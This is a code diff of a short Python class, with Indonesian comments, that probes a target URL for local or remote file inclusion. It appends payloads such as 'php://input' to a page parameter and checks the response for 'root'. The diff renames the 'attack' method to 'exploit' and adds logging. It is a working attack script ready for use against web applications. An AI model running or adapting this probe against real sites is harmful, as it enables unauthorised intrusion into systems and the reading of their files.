@@ -1,17 +1,25 @@
 import requests
+import logging
+
+logger = logging.getLogger(__name__)
 
 class FileInclusion:
     def __init__(self, target_url):
         self.target_url = target_url
 
-    def attack(self, file_path):
-        payload = f"?page={file_path}"
-        url = self.target_url + payload
+    def exploit(self, payload):
+        """
+        Mencoba eksploitasi file inclusion dengan memasukkan file berbahaya.
+        """
         try:
-            response = requests.get(url)
-            if "root" in response.text or "error" in response.text:
-                print(f"Potential LFI/RFI vulnerability found with file: {file_path}")
+            response = requests.get(self.target_url + payload)
+            if "root" in response.text.lower():  # Misalnya, memeriksa hasil yang mengandung "root"
+                logger.info(f"File inclusion vulnerability found at {self.target_url}")
             else:
-                print(f"No vulnerability found for file: {file_path}")
-        except requests.RequestException as e:
-            print(f"Error during File Inclusion attack: {e}")
+                logger.info("No file inclusion detected.")
+        except Exception as e:
+            logger.error(f"Error during file inclusion attack: {str(e)}")
+
+# Contoh penggunaan:
+# file_inclusion = FileInclusion("http://example.com/index.php?page=")
+# file_inclusion.exploit("php://input")
